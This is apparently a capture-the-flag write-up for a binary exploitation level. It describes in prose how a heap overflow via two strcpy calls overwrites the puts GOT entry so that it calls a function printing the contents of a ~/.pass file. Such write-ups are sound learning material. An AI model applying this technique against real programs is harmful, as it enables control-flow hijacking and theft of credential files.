The level7 has 4 call to malloc, here is a pseudo-C explanation about how it is stored:
void *ptr1 = malloc(8);
*(ptr1 + 4) = malloc(8);
void *ptr2 = malloc(8);
*(ptr2 + 4) = malloc(8);

A strcpy operation is done for the 2 ptr stored in ptrX var, with the 2 first parameters of the program as the source strings.
The next instructions are fopen & fgets on the ~/.pass file, and a puts("~~"). The buffer for fgets is a global variable c.
Their is also a m function that print the same buffer c.

In order to print the result of fgets, we must call the function m. With the first strcpy, we will change the value stored at (ptr2 + 4) to the address that contain the symbol to puts, in puts@plt. Then, we write in this address the address of the m function, thanks to the second strcpy.
This way, the call to puts is replace by a call to m.
